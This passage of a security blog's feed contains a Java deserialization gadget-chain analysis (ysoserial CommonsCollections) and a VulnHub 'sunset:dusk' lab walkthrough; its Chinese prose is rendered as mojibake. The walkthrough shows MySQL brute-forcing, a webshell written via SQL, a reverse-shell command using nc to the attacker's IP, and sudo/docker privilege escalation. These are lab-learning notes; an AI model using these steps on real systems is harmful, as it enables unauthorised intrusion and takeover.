class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input object (leaving it unchanged) into some output object.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  the object to be transformed, should be left unchanged</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> a transformed object</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ClassCastException (runtime) if the input is the wrong class</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException (runtime) if the input is invalid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> FunctorException (runtime) if the transform cannot be completed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ª<code>Transform</code>æ–¹æ³•ä¼šåœ¨åé¢çš„gadgetä¸­è¢«ä½¿ç”¨åˆ°</p><h3 id="ChainedTransformer-java"><a href="#ChainedTransformer-java" class="headerlink" title="ChainedTransformer.java"></a>ChainedTransformer.java</h3><p>åœ¨<code>ChianedTransformer</code>å¯¹è±¡ä¸­ï¼Œå®ç°çš„<code>Transform</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Transforms the input to result via each decorated transformer</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> object  the input object passed to the first transformer</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment">*/</span>    </span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨é‡Šé‡Œè¯´æ˜äº†è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨</p><blockquote><p>  é€šè¿‡æ¯ä¸ªä¿®é¥°çš„å˜æ¢å™¨å°†è¾“å…¥è½¬æ¢ä¸ºç»“æœ</p></blockquote><p>çœ‹ä»£ç å¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯æŠŠ<code>iTransformers</code>é‡Œçš„å¯¹è±¡çš„<code>transform</code>æ–¹æ³•çš„è¾“å‡ºå˜æˆä¸‹ä¸€ä¸ªå¯¹è±¡çš„è¾“å…¥ã€‚</p><p>ä¹Ÿå°±æ˜¯ç±»ä¼¼äºä¸‹å›¾çš„æµç¨‹</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201205120358340.png" alt="image-20201205120358340"></p><p>åœ¨æœ¬gadgetä¸­ï¼Œ<code>ChainedTransformer</code>å­˜æ”¾äº†ä¸€ä¸ª<code>Transform</code>æ•°ç»„</p><p>é‡Œé¢åˆ†åˆ«æ˜¯<code>ConstantTransformer, InvokeTransformer * 3, 1</code></p><h3 id="ConstansTransformer-java"><a href="#ConstansTransformer-java" class="headerlink" title="ConstansTransformer.java"></a>ConstansTransformer.java</h3><p>è¦å…³æ³¨çš„åªæœ‰<code>Transform</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Transforms the input by ignoring it and returning the stored constant instead.</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> input  the input object which is ignored</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the stored constant</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ç®¡è¾“å…¥ä»€ä¹ˆå€¼ï¼Œ<code>Transform</code>æ–¹æ³•éƒ½ä¼šè¿”å›ä¸€ä¸ª<code>iConstant</code>å¯¹è±¡ï¼Œè¿™ä¸ª<code>iConstant</code>å¯¹è±¡åœ¨æ„é€ çš„æ—¶å€™ä¼ å…¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ç®¡ä¼ å…¥çš„æ˜¯å•¥éƒ½ä¼šè¿”å›æ„é€ çš„æ—¶å€™ç»™çš„ç±»ã€‚åœ¨ä¸Šé¢çš„åˆ©ç”¨é“¾ä¸­å°±æ˜¯<code>RunTime.class</code></p><h3 id="InvokeTransformer-java"><a href="#InvokeTransformer-java" class="headerlink" title="InvokeTransformer.java"></a>InvokeTransformer.java</h3><p>åŒæ ·è¦å…³æ³¨<code>Transform</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Transforms the input to result by invoking a method on the input.</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> input  the input object to transform</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the transformed result, null if null input</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">        Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼ å…¥ä¸€ä¸ªå‚æ•°ï¼Œä¼šé€šè¿‡<code>iParamTypes</code>æ‰¾åˆ°è¿™ä¸ªå‚æ•°çš„<code>iMethodName</code>æ–¹æ³•ï¼Œå¹¶æŠŠ<code>iArgs</code>ï¼Œä½œä¸ºå‚æ•°ä¼ å…¥å…¶ä¸­ï¼Œè°ƒç”¨æ–¹æ³•ã€‚</p><p>å…¶ä¸­<code>iMethodName</code>ï¼Œ<code>iParamTypes</code>ï¼Œ<code>iArgs</code>éƒ½æ˜¯æ„é€ æ—¶ä¼ å…¥çš„å‚æ•°ã€‚</p><h3 id="chain"><a href="#chain" class="headerlink" title="chain"></a>chain</h3><p>é€šè¿‡ä¸Šé¢çš„å‡ ä¸ª<code>Transformer</code>ï¼Œæœ€ç»ˆå¾—å‡ºçš„è°ƒç”¨é¡ºåºä¸º</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201205122505998.png" alt="image-20201205122505998"></p><p>è¿™æ ·å°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><p>ä½†æ˜¯ä¸Šé¢çš„è¿˜ä¸æ˜¯å¾ˆå®Œå¤‡ï¼Œå› ä¸ºè¿™ä¸ªåªæœ‰å½“<code>ChainedTransformer</code>å¯¹è±¡çš„<code>Transform</code>æ–¹æ³•è¢«è°ƒç”¨æ—¶æ‰èƒ½è§¦å‘ã€‚æ‰€ä»¥ç”¨åˆ°äº†<code>LazyMap</code>ã€‚</p><h3 id="LazyMap-java"><a href="#LazyMap-java" class="headerlink" title="LazyMap.java"></a>LazyMap.java</h3><p>åœ¨<code>LazyMap</code>ä¸­çš„<code>get</code>æ–¹æ³•ä½¿ç”¨åˆ°äº†<code>transform</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//-----------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123;</span><br><span class="line">        Object value = factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>factory</code>å¯¹è±¡åœ¨é™æ€æ–¹æ³•<code>decorate</code>ä¸­è¢«èµ‹å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åé—®é¢˜å°±å˜æˆäº†å¦‚ä½•æ‰èƒ½è°ƒç”¨<code>LazyMap.get()</code>æ–¹æ³•äº†</p><p>éœ€è¦æ‰¾ä¸€ä¸ªèƒ½å¤Ÿåœ¨<code>readObject</code>ä¸­è°ƒç”¨<code>get()</code>æ–¹æ³•çš„ç±»</p><p>è¿™ä¸ªç±»å°±æ˜¯<code>sun.reflect.annotation.AnnotationInvocationHandler</code></p><h3 id="AnnotationInvocationHandler-java"><a href="#AnnotationInvocationHandler-java" class="headerlink" title="AnnotationInvocationHandler.java"></a>AnnotationInvocationHandler.java</h3><p>ç”±äºæˆ‘è¿™æ²¡æœ‰ä¸‹è½½æºç ï¼Œçœ‹åˆ°çš„ä»£ç æ˜¯åç¼–è¯‘.classæ–‡ä»¶çš„ç»“æœï¼Œæ‰€ä»¥æœ‰äº›å‡ºå…¥ï¼Œä½†æ˜¯ä¸å½±å“åˆ†æã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var3 = var2.memberTypes();</span><br><span class="line">    Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        Entry var5 = (Entry)var4.next();</span><br><span class="line">        String var6 = (String)var5.getKey();</span><br><span class="line">        Class var7 = (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object var8 = var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦çœ‹<code>while</code>å†…éƒ¨çš„ä»£ç ï¼Œå‘ç°é‡Œé¢ä½¿ç”¨åˆ°äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Map var3 = var2.memberTypes();</span><br><span class="line">...</span><br><span class="line">String var6 = (String) var5.getKey();</span><br><span class="line">Class var7 = (Class)var3.get(var6);</span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº†<code>get()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ANN_INV_HANDLER_CLASS = <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title">createMemoizedInvocationHandler</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸ºä»€ä¹ˆéœ€è¦ç”¨åå°„"><a href="#ä¸ºä»€ä¹ˆéœ€è¦ç”¨åå°„" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦ç”¨åå°„"></a>ä¸ºä»€ä¹ˆéœ€è¦ç”¨åå°„</h3><blockquote><p>  Javaä¸­ä¸æ˜¯æ‰€æœ‰å¯¹è±¡éƒ½â½€æŒåºåˆ—åŒ–ï¼Œå¾…åºåˆ—åŒ–çš„å¯¹è±¡å’Œæ‰€æœ‰å®ƒä½¿â½¤çš„å†…éƒ¨å±æ€§å¯¹è±¡ï¼Œå¿…é¡»éƒ½å® ç°äº† java.io.Serializable æ¥â¼ã€‚â½½æˆ‘ä»¬æœ€æ—©ä¼ ç»™ConstantTransformerçš„ æ˜¯ Runtime.getRuntime() ï¼ŒRuntimeç±»æ˜¯æ²¡æœ‰å®ç° java.io.Serializable æ¥â¼çš„ï¼Œæ‰€ä»¥ä¸å…è®¸è¢« åºåˆ—åŒ–ã€‚                                                                                    â€”â€”æ‘˜è‡ªpç¥çŸ¥è¯†æ˜Ÿçƒã€Šjavaå®‰å…¨æ¼«è°ˆã€‹</p></blockquote><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>æš‚æ—¶ç”±äºç¯å¢ƒé—®é¢˜è¿˜æ²¡è°ƒè¯•ï¼Œä¹‹ååˆ†æï¼ˆ</p><h2 id="ç‰ˆæœ¬é™åˆ¶"><a href="#ç‰ˆæœ¬é™åˆ¶" class="headerlink" title="ç‰ˆæœ¬é™åˆ¶"></a>ç‰ˆæœ¬é™åˆ¶</h2><p>åœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­å¯ä»¥å‘ç°ï¼Œå¦‚æœjdkç‰ˆæœ¬è¿‡é«˜ï¼Œååºåˆ—åŒ–å<code>LazyMap</code>å¯¹è±¡ä¼šè¢«è§£é‡Šæˆä¸€ä¸ª<code>LinkedHashMap</code>å¯¹è±¡ï¼Œä½¿å¾—ä¸Šé¢çš„gadgetæ— æ³•è¢«åˆ©ç”¨ã€‚</p><h2 id="å¦ä¸€ç§æ–¹æ³•"><a href="#å¦ä¸€ç§æ–¹æ³•" class="headerlink" title="å¦ä¸€ç§æ–¹æ³•"></a>å¦ä¸€ç§æ–¹æ³•</h2><p>ä¸åªæ˜¯<code>LazyMap</code>å¯ä»¥è§¦å‘ä¸Šè¿°ç‚¹ï¼Œåœ¨<code>TransformedMap</code>ä¸­ä¹Ÿæœ‰ç±»ä¼¼çš„æ“ä½œï¼Œæœ‰å¾…ä¹‹ååˆ†æã€‚</p>]]></content>
      
      
      <categories>
          
          <category> JavaWeb </category>
          
          <category> ysoserial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaWeb </tag>
            
            <tag> ysoserial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub sunset:duské¶æœº</title>
      <link href="/sunset-dusk.html"/>
      <url>/sunset-dusk.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ sunset-decoy é¶æœº</p><p>ç®€å•éš¾åº¦</p><a id="more"></a><h1 id="sunset-dusk"><a href="#sunset-dusk" class="headerlink" title="sunset:dusk"></a>sunset:dusk</h1><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><ul><li>  é¶æœºï¼š<code>192.168.2.2</code></li><li>  æ”»å‡»æœºï¼š <code>192.168.2.3</code></li></ul><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p>ç›®æ ‡é¶æœºå¼€æ”¾äº†<code>21, 22, 25, 80, 3306, 8080</code>ç«¯å£</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204102852598.png" alt="image-20201204102852598"></p><h2 id="web-attack"><a href="#web-attack" class="headerlink" title="web_attack"></a>web_attack</h2><h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p>è®¿é—®<code>80</code>ç«¯å£ï¼Œæ˜¯<code>apache</code>çš„é»˜è®¤é¡µé¢</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103005406.png" alt="image-20201204103005406">çˆ†ç ´ä¸€ä¸‹ç›®å½•</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103131440.png" alt="image-20201204103131440"></p><p>å•¥ä¹Ÿæ²¡æœ‰ï¼Œçœ‹æ¥å…¥å£ç‚¹ä¸æ˜¯è¿™å„¿</p><h3 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h3><p>è¿˜æœ‰ä¸€ä¸ª8080ç«¯å£ï¼Œè®¿é—®ä¸€ä¸‹ï¼Œå‘ç°åˆ—å‡ºäº†ç›®å½•å†…å®¹å’Œç›®å½•è·¯å¾„</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103504978.png" alt="image-20201204103504978"></p><p>åº”è¯¥æ˜¯åœ¨è¿™ä¸ªåœ°æ–¹å†™webshelläº†</p><p>ä½†æ˜¯åˆæ²¡æœ‰èƒ½å¤Ÿå†™çš„åœ°æ–¹ã€‚</p><h3 id="3306"><a href="#3306" class="headerlink" title="3306"></a>3306</h3><p>å°è¯•ä¸€ä¸‹sqlå¯†ç çš„çˆ†ç ´</p><p>ç»“æœå•ªçš„ä¸€ä¸‹å°±çˆ†å‡ºæ¥äº†ï¼Œå¾ˆå¿«å•Š</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103642826.png" alt="image-20201204103642826"></p><p>è¿ä¸Šå»</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103716762.png" alt="image-20201204103716762"></p><p>çœ‹ä¸€ä¸‹èƒ½å¦å†™æ–‡ä»¶ï¼Œ</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103759529.png" alt="image-20201204103759529"></p><p>å‘ç°<code>secure_file_priv</code>è¿™ä¸€æ ä¸ºç©ºï¼Œä»£è¡¨ä»»ä½•ç›®å½•éƒ½å¯ä»¥å†™ã€‚é‚£å°±å†™å…¥ä¸€ä¸ªwebshell</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204103943177.png" alt="image-20201204103943177"></p><p>è®¿é—®<code>http://192.168.2.2:8080/1.php</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104014665.png" alt="image-20201204104014665"></p><p>æ‹¿ä¸€ä¸ªåå¼¹shell</p><p><code>http://192.168.2.2:8080/1.php?cmd=nc -e /bin/bash 192.168.2.3 8848</code></p><p>åœ¨æœ¬æœºç›‘å¬ç«¯å£<code>nc -vlp 8848</code></p><p>æ¥æ”¶åˆ°ä¸€ä¸ªåå¼¹shellï¼Œå¹¶ä½¿ç”¨ptyæ¨¡å—</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104215760.png" alt="image-20201204104215760"></p><p>è‡³æ­¤ï¼Œå†™å…¥äº†webshell</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æŸ¥æ‰¾ä¸€ä¸‹å…·æœ‰<code>setuid</code>æƒé™çš„ç¨‹åº</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104326786.png" alt="image-20201204104326786"></p><p>æ²¡å•¥èƒ½ç”¨çš„</p><p><code>sudo -l</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104349290.png" alt="image-20201204104349290"></p><p><code>make</code>æ˜¯å¯ä»¥ææƒçš„ã€‚</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104432893.png" alt="image-20201204104432893"></p><p>ç…§ç€åšï¼Œææƒåˆ°<code>dusk</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104625718.png" alt="image-20201204104625718"></p><p>ç›´æ¥å†™å…¥<code>.ssh/authorized_keys</code></p><p>ä½¿ç”¨sshç™»å½•</p><p>ç„¶åå°±æ–­äº†ï¼Œç¿»æ‰¾äº†ä¸€ä¸‹ï¼Œå‘ç°<code>docker</code>èƒ½å¤Ÿææƒ</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104755286.png" alt="image-20201204104755286"></p><p>å°è¯•ä¸€ä¸‹</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104814575.png" alt="image-20201204104814575"></p><p>å•Šè¿™ï¼Ÿ</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204105143223.png" alt="image-20201204105143223"></p><h2 id="å°æ’æ›²"><a href="#å°æ’æ›²" class="headerlink" title="å°æ’æ›²"></a>å°æ’æ›²</h2><p>åœ¨å°è¯•ææƒçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘è¯•ç€ç”¨<code>ps -auxwww</code>å‘½ä»¤ï¼ŒæŸ¥çœ‹äº†ä¸€ä¸‹å†å²è¿›ç¨‹</p><p>å‘ç°äº†<code>root</code>è¿è¡Œçš„<code>ftp</code>çš„ç”¨æˆ·åå’Œå¯†ç </p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204104935220.png" alt="image-20201204104935220"></p><p>ç„¶åftpç™»å½•ä¸Šå»</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201204105020833.png" alt="image-20201204105020833"></p><p>è·¯å¾„æ˜¯<code>/root</code>ï¼Œä¸‹é¢çš„<code>root.txt</code>å°±æ˜¯æœ€ç»ˆçš„flagï¼Œå¯ä»¥getä¸‹æ¥ã€‚ã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> sunset </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> enum </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub sunset:nightfallé¶æœº</title>
      <link href="/sunset-nightfall.html"/>
      <url>/sunset-nightfall.html</url>
      
